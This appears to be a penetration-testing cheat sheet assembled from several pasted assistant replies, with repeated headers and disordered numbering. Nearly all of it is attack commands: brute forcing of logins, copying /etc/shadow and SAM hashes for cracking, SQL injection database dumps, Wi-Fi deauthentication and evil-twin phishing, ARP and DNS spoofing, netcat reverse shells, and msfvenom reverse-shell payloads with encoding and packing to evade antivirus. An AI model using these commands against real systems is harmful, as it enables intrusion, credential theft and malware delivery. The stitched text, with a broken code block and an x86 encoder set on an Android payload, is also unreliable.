Here's a refined version of your text formatted as a GitHub README file:

---

# Penetration Testing Tools

## 1. Hydra: Network Service Brute Forcing

Common Services You Can Target:
- FTP: `ftp://<target_ip>`
- SSH: `ssh://<target_ip>`
- HTTP (Basic Auth): `http-get://<target_ip>`
- Telnet: `telnet://<target_ip>`
- SMB (Windows shares): `smb://<target_ip>`

**Usage Examples:**
```sh
hydra -L usernames.txt -P passwords.txt ftp://<target_ip>
hydra -C combos.txt ftp://<target_ip>
hydra -l admin -P passwords.txt ftp://<target_ip>
hydra -L usernames.txt -p 123456 ftp://<target_ip>
hydra -L usernames.txt -P passwords.txt ssh://<target_ip>
hydra -L usernames.txt -P passwords.txt http-get://<target_ip>/login
hydra -V -L usernames.txt -P passwords.txt ftp://<target_ip>
hydra -L usernames.txt -P passwords.txt -t 4 ftp://<target_ip>
hydra -L usernames.txt -P passwords.txt ftp://<target_ip> -o results.txt
hydra -R
```

## 2. John the Ripper: Password Hash Cracking

John is designed to crack offline password hashes.

**Usage Examples:**
```sh
john [options] [hashfile]
john hashfile.txt
john --wordlist=customlist.txt hashfile.txt
john --format=NT hashfile.txt
john --format=raw-md5 hashfile.txt
john --incremental hashfile.txt
john --show hashfile.txt
john --restore
john --show hashfile.txt > cracked_passwords.txt
samdump2 SYSTEM SAM > hashes.txt
cp /etc/shadow hashfile.txt
```

## 3. Hashcat: Password Cracking Using GPU

**Usage:**
```sh
hashcat -m [hash_type] -a [attack_mode] [hash_file] [wordlist]
```

**Common Hash Types:**
| Hash Type      | Mode   |
|----------------|--------|
| MD5            | 0      |
| SHA1           | 100    |
| SHA256         | 1400   |
| NTLM (Windows) | 1000   |
| bcrypt         | 3200   |
| WPA/WPA2       | 22000  |

**Usage Examples:**
```sh
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 ntlm_hashes.txt passwords.txt
hashcat -m 22000 -a 3 handshake.hc22000 ?d?d?d?d?d?d?d?d
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l
hashcat --restore
hashcat -m 0 --show hashes.txt
```

## 4. SQLMap: Automated SQL Injection Tool

SQLMap automates the process of detecting and exploiting SQL Injection vulnerabilities.

**Usage:**
```sh
sqlmap -u [URL] [options]
```

**Usage Examples:**
```sh
sqlmap -u "http://example.com/page.php?id=1"
sqlmap -u "http://example.com/page.php?id=1" --dbs
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump
sqlmap -u "http://example.com/page.php?id=1" --tamper=between
sqlmap -u "http://example.com/login.php" --data="username=admin&password=1234"
sqlmap -u "http://example.com/page.php?id=1" --batch --risk=3 --level=5
```

**Steps:**
1. Check if the Website is Vulnerable:
    ```sh
    sqlmap -u "http://example.com/vulnerable_param=1"
    ```
2. Fingerprint the Database:
    ```sh
    sqlmap -u "http://example.com/index.php?id=1" --banner
    ```
3. Enumerate Databases:
    ```sh
    sqlmap -u "http://example.com/index.php?id=1" --dbs
    ```
4. Select a Specific Database:
    ```sh
    sqlmap -u "http://example.com/index.php?id=1" -D database_name --tables
    ```
5. Enumerate Columns in a Table:
    ```sh
    sqlmap -u "http://example.com/index.php?id=1" -D database_name -T table_name --columns
    ```
6. Dump Data from Specific Columns:
    ```sh
    sqlmap -u "http://example.com/index.php?id=1" -D database_name -T table_name -C column_name --dump
    ```
7. Automate Entire Process:
    ```sh
    sqlmap -u "http://example.com/index.php?id=1" --batch --dump
    ```

**Useful Options:**
- `--level=5`: Increases the level of tests (more intensive scanning).
- `--risk=3`: Sets the risk level (3 is the highest).
- `--random-agent`: Uses a random User-Agent for requests to evade detection.
- `--tor`: Uses Tor for anonymizing your connection.

## 6. Commix: Automated Command Injection Tool

Commix automates the detection and exploitation of Command Injection vulnerabilities.

**Usage Examples:**
```sh
commix --url="http://example.com/page.php?id=1" [options]
```
Using POST Data:
```sh
commix --url="http://example.com/page.php?id=1"
```
Test All Parameters for Injection:
```sh
commix --url="http://example.com/page.php?id=1&name=test" --all
```
Enable Bypass Techniques (WAF Bypass):
```sh
commix --url="http://example.com/page.php?id=1" --tamper
```
Establish Reverse Shell (if vulnerable):
```sh
commix --url="http://example.com/page.php?id=1" --os-shell
```

## 7. WPScan: WordPress Vulnerability Scanner

WPScan is used to find vulnerabilities in WordPress installations.

**Basic Syntax:**
```sh
wpscan --url [target_url] [options]
```

**Usage Examples:**
```sh
wpscan --url http://example.com
wpscan --url http://example.com --enumerate p
wpscan --url http://example.com --enumerate u
wpscan --url http://example.com --passwords passwords.txt --usernames admin
wpscan --url http://example.com --api-token YOUR_API_KEY
wpscan --url http://example.com -o results.txt
```

---
Here's a refined version of your text formatted as a GitHub README file:

---

# Penetration Testing Tools

## 1. Aircrack-ng: Wi-Fi Cracking Suite
Aircrack-ng is a suite of tools for monitoring, attacking, testing, and cracking Wi-Fi networks.

**Steps:**
1. **Enable Monitor Mode:**
   ```sh
   sudo airmon-ng
   sudo airmon-ng start wlan0
   sudo airmon-ng check kill
   ```
2. **Scan Available Networks:**
   ```sh
   sudo airodump-ng wlan0mon
   ```
3. **Capture Handshakes:**
   ```sh
   sudo airodump-ng --bssid [Target_BSSID] -c [Channel] -w capture wlan0mon
   sudo aireplay-ng --deauth 10 -a [Target_BSSID] wlan0mon
   ```
4. **Crack the Captured Handshake:**
   ```sh
   sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
   ```
5. **Disable Monitor Mode:**
   ```sh
   sudo airmon-ng stop wlan0mon
   sudo service NetworkManager start
   ```

## 2. Wifite: Automated Wi-Fi Cracking Tool
```sh
sudo wifite
sudo wifite --wps-only
```

## 3. Wifiphisher: Wi-Fi Phishing Attack Tool
Wifiphisher is a tool for conducting phishing attacks against Wi-Fi networks. It creates rogue access points to trick users into revealing passwords.

**Basic Syntax:**
```sh
sudo wifiphisher [options]
```
**Usage Examples:**
```sh
sudo wifiphisher --essid [Network_Name]
sudo wifiphisher --phishing-page simple_login
sudo wifiphisher --deauth-alldevices
sudo wifiphisher --evil-twin
sudo wifiphisher -v
sudo wifiphisher -aI wlan0 -jI wlan1
```
  - `-aI`: Interface for rogue AP.
  - `-jI`: Interface for jamming legitimate AP.

## 4. Nmap: Network Scanning and Enumeration Tool
Nmap is one of the most widely used tools for network discovery and vulnerability scanning.

**Basic Syntax:**
```sh
nmap [options] [target]
```
**Usage Examples:**
```sh
nmap 192.168.1.1
nmap 192.168.1.1 192.168.1.2 192.168.1.3
nmap 192.168.1.1-10
nmap 192.168.1.0/24
nmap -sV 192.168.1.1
nmap -O 192.168.1.1
nmap -A 192.168.1.1
nmap -p 22,80,443 192.168.1.1
nmap -oN output.txt 192.168.1.1
```
**Top 10 Nmap Scripts:**
```sh
nmap [port] --script=http-enum [target]
nmap -p 445 --script=smb-os-discovery [target]
nmap --script=dns-brute [target]
nmap --script=ssl-enum-ciphers [target]
nmap -p 21 --script=ftp-anon [target]
nmap -p 25 --script=smtp-enum-users [target]
nmap -p 161 --script=snmp-info [target]
nmap -p 3306 --script=mysql-info [target]
nmap -p 22 --script=ssh2-enum-algos [target]
nmap --script=vuln [target]
```

## 5. Metasploit: Exploitation Framework
Metasploit is a powerful tool for developing, testing, and executing exploits.

**Usage Examples:**
```sh
msfconsole
search [exploit_name]
use exploit/windows/smb/ms08_067_netapi
show options
set RHOST 192.168.1.5
set RPORT 445
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit
background
sessions -l
sessions -i [session_id]
```

## 6. Crunch: Custom Wordlist Generator
Crunch creates custom wordlists based on specific patterns and lengths.

**Usage Examples:**
```sh
crunch 4 6 abc123 -o wordlist.txt
crunch 4 8 0123456789 -o numbers.txt
crunch 8 8 -t @@2022@@ -o pattern.txt
crunch 6 8 -o customlist.txt
```

## 7. Medusa: Parallel, Modular Login Brute-Forcer
Medusa is a fast, parallel brute-forcing tool for services like FTP, SSH, HTTP, and more.

**Basic Syntax:**
```sh
medusa -h [host] -u [username] -P [password_list] -M [module]
```
**Usage Examples:**
```sh
medusa -h 192.168.1.5 -u admin -P passwords.txt -M ftp
medusa -h 192.168.1.5 -u root -P /usr/share/wordlists/rockyou.txt -M ssh
medusa -h 192.168.1.5 -u admin -P passwords.txt -M http -m DIR:/admin
medusa -H hosts.txt -u admin -P passwords.txt -M ssh
```

## 8. Ettercap: Network Sniffing and Man-in-the-Middle (MITM) Attacks
Ettercap is a tool for MITM attacks on LANs.

**Basic Syntax:**
```sh
sudo ettercap [options]
```
**Usage Examples:**
```sh
sudo ettercap -G
sudo ettercap -T -q -i wlan0 -M arp:remote /192.168.1.1/ /192.168.1.5/
sudo ettercap -T -i wlan0
sudo ettercap -T -w capture.pcap
```
  - `-T`: Text mode.
  - `-q`: Quiet mode.
  - `-M arp:remote`: ARP spoofing between the router and target.

## 9. Bettercap: Advanced Network Attacks & Monitoring
Bettercap is an improved, modular version of Ettercap for network attacks, MITM, and packet sniffing.

**Basic Syntax:**
```sh
sudo bettercap -iface wlan0
```
**Usage Examples:**
```sh
net.probe on
net.recon on
net.sniff on
set arp.spoof.targets 192.168.1.5
arp.spoof on
http.proxy on
set dns.spoof.domains example.com
set dns.spoof.address 192.168.1.100
dns.spoof on
net.sniff on
exit
```

---

Here's how you can format the provided lines into a GitHub README file:

```markdown
# Networking and Security Tools Cheat Sheet

## 14. Netcat (nc): The Swiss Army Knife of Networking
Netcat is a versatile tool for reading from and writing to network connections using TCP/UDP. It's often used for port scanning, file transfers, and even reverse shells.

**Basic Syntax:**
```
nc [options] [host] [port]
```

**Simple Port Scanning:**
```
nc -zv 192.168.1.1 20-80
```
- `-z`: Zero-I/O mode (for scanning).
- `-v`: Verbose output.

**Banner Grabbing (Check Service Info):**
```
nc 192.168.1.1 80
```
Then type:
```
GET / HTTP/1.1
Host: 192.168.1.1
```

**File Transfer (Sender):**
```
nc -l -p 1234 > received_file.txt
```

**File Transfer (Receiver):**
```
nc 192.168.1.5 1234 < file.txt
```

**Chat Between Two Systems:**
_On System 1 (Listener):_
```
nc -l -p 1234
```
_On System 2 (Sender):_
```
nc 192.168.1.5 1234
```

**Bind Shell (Remote Shell Access):**
_On Target Machine:_
```
nc -l -p 4444 -e /bin/bash
```
_On Attacker's Machine:_
```
nc 192.168.1.5 4444
```

**Reverse Shell (Connect Back to Attacker):**
_On Attacker's Machine (Listener):_
```
nc -l -p 4444
```
_On Target Machine:_
```
nc 192.168.1.10 4444 -e /bin/bash
```

## 15. Telnet: Simple Text-Based Remote Communication
Telnet is a network protocol used to provide command-line access to remote systems, primarily on port 23. It’s also useful for testing network services.

**Basic Syntax:**
```
telnet [host] [port]
```

**Connect to a Telnet Server:**
```
telnet 192.168.1.5 23
```

**Test Open Ports (Similar to Netcat):**
```
telnet 192.168.1.1 80
```
Then type:
```
GET / HTTP/1.1
Host: 192.168.1.1
```

**Escape to Command Mode (in a Telnet session):** Press Ctrl + ], then type:
```
quit
```

**Login to a Remote Device (if Telnet is enabled):**
```
telnet 192.168.1.5
```

## 16. FTP (File Transfer Protocol): For Transferring Files
FTP is a protocol used to transfer files between systems over the network.

**Basic Syntax:**
```
ftp [host]
```

**Connect to an FTP Server:**
```
ftp 192.168.1.5
```

**Anonymous Login (if supported):**
```
ftp 192.168.1.5
```

**List Files on the FTP Server:**
```
ls
```

**Download a File from FTP Server:**
```
get filename.txt
```

**Upload a File to FTP Server:**
```
put localfile.txt
```

**Change Directory on Server:**
```
cd /path/to/directory
```

**Change Local Directory:**
```
lcd /local/path
```

**Exit FTP Session:**
```
bye
```

**Enable Passive Mode (firewall-friendly):**
```
passive
```

## 17. SSH (Secure Shell): Secure Remote Access
SSH is a protocol for secure remote login and command execution over encrypted connections.

**Basic Syntax:**
```
ssh [username]@[host]
```

**Basic SSH Connection:**
```
ssh user@192.168.1.5
```

**Connect on a Different Port:**
```
ssh -p 2222 user@192.168.1.5
```

**Run a Command on Remote System:**
```
ssh user@192.168.1.5 'ls -la /var/www'
```

**Enable Verbose Output (for debugging):**
```
ssh -v user@192.168.1.5
```

**Copy Files Securely Using SCP (Part of SSH):**
```
scp file.txt user@192.168.1.5:/remote/path
```

**Copy from Remote to Local:**
```
scp user@192.168.1.5:/remote/file.txt /local/path
```

**SSH Key Authentication (instead of passwords):**
```
ssh-keygen -t rsa
```

**Copy Public Key to Remote Server:**
```
ssh-copy-id user@192.168.1.5
```

**Connect Using Key (default behavior after copying key):**
```
ssh user@192.168.1.5
```

**Create a Local Port Forward (Tunnel):**
```
ssh -L 8080:localhost:80 user@192.168.1.5
```

**Reverse SSH Tunnel (Remote to Local):**
```
ssh -R 2222:localhost:22 user@192.168.1.5
```

**Disconnect from SSH Session:**
```
exit
```

## 18. Advanced Payload Creation with Encoders (Windows & Android)

### A. Windows Payload with Encoder (Multiple Iterations)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 20 -f exe -o advanced_windows_payload.exe
```

**Explanation:**
- `-p windows/meterpreter/reverse_tcp`: Windows reverse TCP payload.
- `LHOST=<your_IP>`: Your IP address.
- `LPORT=<port>`: Port number (e.g., 4444).
- `-e x86/shikata_ga_nai`: Use the shikata_ga_nai encoder.
- `-i 20`: Apply 20 iterations of encoding for better obfuscation.
- `-f exe`: Output format as an EXE file.
- `-o advanced_windows_payload.exe`: Output file name.

*Combining Multiple Encoders (Windows Example)*
You can even chain multiple encoders to make the payload more complex:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=<port> -e x86/shikata_ga_nai -i 5 -e x86/countdown -i 5 -f exe -o multi_encoded_windows_payload.exe
```

**Encrypting Payloads with Custom Formats (Base64 Encoding for Windows):**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 15 -f raw | base64 > encoded_payload.b64
```
- `-f raw`: Outputs raw bytes.
- `| base64`: Pipes output through Base64 encoding.

### B. Android Payload with Encoder (Multiple Iterations)
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=<port> -e x86/shikata_ga_nai -i 10 -o advanced_android_payload.apk
```

**Explanation:**
- `-p android/meterpreter/reverse_tcp`: Android reverse TCP payload.
- `LHOST=<your_IP>`: Your IP address.
- `LPORT=<port>`: Port number (e.g., 4444).
- `-e x86/shikata_ga_nai`: Use the shikata_ga_nai encoder.
- `-i 10`: Apply 10 iterations of encoding.
- `-o advanced_android_payload.apk`: Output file name.

### Setting Up the Listener (Same for Both)
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

### Extra Advanced Evasion Tips
**Use Packers like UPX (Ultimate Packer for Executables):**
```
upx --best advanced_windows_payload.exe
```

**Modify Payload Signatures:**
Open the EXE or APK in a hex editor and modify non-executable sections.

**Use External Obfuscation Tools:**
For Android: Use tools like `apktool` to decompile, modify, and recompile the APK.
```
## Firewalld

1. **List Firewall Rules:** To see the currently active firewall rules, use:
    ```
    firewall-cmd --list-all
    ```
2. **Add or Remove a Port:**
    ```
    firewall-cmd --add-port=80/tcp --permanent
    ```
3. **Allow or Deny a Service:**
    ```
    firewall-cmd --add-service=ssh --permanent
    ```
    To deny a service:
    ```
    firewall-cmd --remove-service=ssh --permanent
    ```
4. **Change the Default Zone:** Firewalld uses zones to define network trust levels. To set a different default zone (e.g., from “public” to “home”):
    ```
    firewall-cmd --set-default-zone=home
    ```
5. **Reload the Firewall:**
    ```
    firewall-cmd --reload
    ```
6. **Block an IP Address:**
    ```
    firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.1.100" reject'
    ```
7. **Remove a Rule:**
    ```
    firewall-cmd --remove-port=80/tcp --permanent
    ```
